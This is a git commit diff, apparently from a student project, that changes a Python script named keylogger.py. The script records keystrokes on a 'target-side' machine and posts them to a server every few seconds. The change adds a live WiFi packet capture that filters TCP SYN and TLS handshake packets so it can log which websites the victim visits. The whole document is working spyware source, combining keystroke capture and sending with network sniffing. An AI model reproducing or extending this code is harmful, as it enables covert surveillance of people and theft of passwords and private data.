4f9f1b34e63e6d67a8c12983659c9f32bd0766bf
Cope, Louis(Student) <l.cope@lancaster.ac.uk>
2026-01-25 13:39:49 +0000

    Added reading of packet information on "target-side" machine across the WiFi interface, filtering to only accept TCP SYN and TLS packets. Provides IP addresses of visited websites

--- keylogger.py
+++ keylogger.py
@@ -1,10 +1,9 @@
 import keyboard
 import requests as rq
-import socket
 from time import time
 import threading
+import pyshark
 
-ip = socket.gethostbyname(socket.gethostname())
 server = "http://localhost:5000"
 
 def sendKeyLog(record):
@@ -14,17 +13,32 @@ def sendKeyLog(record):
             recordlist += item.name
     rs = rq.post(server + "/key", recordlist.encode('utf-8'))
 
+def sniff():
+    capture = pyshark.LiveCapture(interface="WiFi", bpf_filter="tcp dst port 443 and ((tcp[((tcp[12] & 0xf0) >> 2)] = 0x16) or (tcp[13] & 0x02 = 2))")
+    print("capture set")
+    capture.sniff(timeout=10)
+    print("sniffing...")
+    packets = [packet for packet in capture._packets]
+    capture.close()
+    print("capture closed")
+    print(f"Packet count: {len(packets)}")
+    with open("text.txt", "w") as f:
+        for packet in packets:
+            f.write(str(packet) + "\n")
+
 def main():
     count = 0
     ts = time()
     keyboard.start_recording()
+    sniff()
     while True:
         dt = time()
-        if dt - ts > 60:
+        if dt - ts > 10:
             record = keyboard.stop_recording()
             sendKeyLog(record)
             ts = time()
             keyboard.start_recording()
+            sniff()
             
         
 if __name__=="__main__":
